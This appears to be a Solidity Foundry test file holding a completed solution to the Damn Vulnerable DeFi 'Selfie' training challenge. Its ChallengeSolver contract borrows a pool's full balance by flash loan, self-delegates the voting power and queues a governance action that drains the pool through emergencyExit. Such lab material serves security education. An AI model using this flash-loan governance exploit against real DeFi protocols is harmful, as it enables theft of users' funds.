// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // get current action counter value since it will be the next queued actions ID number
        uint256 actionId = governance.getActionCounter();

        // deploy challenge solver contract to receive flash loan and queue proposal to governance contract
        ChallengeSolver solver = new ChallengeSolver(token, governance, pool, recovery);
        // begin flash loan operations
        solver.run();

        // advance time until governance proposal can be executed
        vm.warp(block.timestamp + governance.getActionDelay() + 1);
        vm.roll(block.number + 1);

        // execute governance proposal we submitted that uses SelfiePool::emergencyExit function to send all DVV from selfie pool to recovery address
        governance.executeAction(actionId);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

/*//////////////////////////////////////////////////////////////
                            SOLUTION
//////////////////////////////////////////////////////////////*/

// import necessary interface so we can receive flash loans from SelfiePool
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

// inherit imported interface
contract ChallengeSolver is IERC3156FlashBorrower {
    error ChallengeSolver__InvalidSender();

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;

    // load necessary state to storage
    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    // initiate flash loan process and set DVV approval
    function run() public {
        // infinite approval so flash loan can be easily repaid
        token.approve(address(pool), type(uint256).max);
        // take out max flash loan so we have enough voting power to propose malicious action to governance contract
        pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "");
    }

    // need to implement onFlashLoan function from ERC3156 to receive the flash loan then propose the emergency exit function call as an action to the governance contract
    function onFlashLoan(address _sender, address _token, uint256 _amount, uint256 _fee, bytes calldata)
        external
        returns (bytes32)
    {
        // access controls, not needed but still good practice
        if (_sender != address(this)) {
            revert ChallengeSolver__InvalidSender();
        }
        // check voting power after receiving DVV tokens from flash loan
        console.log("votes during flash loan: ", token.getVotes(address(this)));
        // propose action to governance contract while we hold enough tokens (from the flash loan) to pass the vote
        _executeActionDuringFlashLoan();
        // necessary return for valid ERC3156FlashBorrower contract
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function _executeActionDuringFlashLoan() internal {
        // delegate voting power equal to flash loan balance to self
        token.delegate(address(this));
        // check how much voting power we have
        console.log("votes after delegation: ", token.getVotes(address(this)));
        // encode function call for governance action
        bytes memory governanceData = abi.encodeWithSelector(pool.emergencyExit.selector, recovery);
        // queue malicious governance action while we have sufficient voting power
        // action will be executed later after appropriate amount of time has passed
        governance.queueAction(address(pool), 0, governanceData);
    }
}
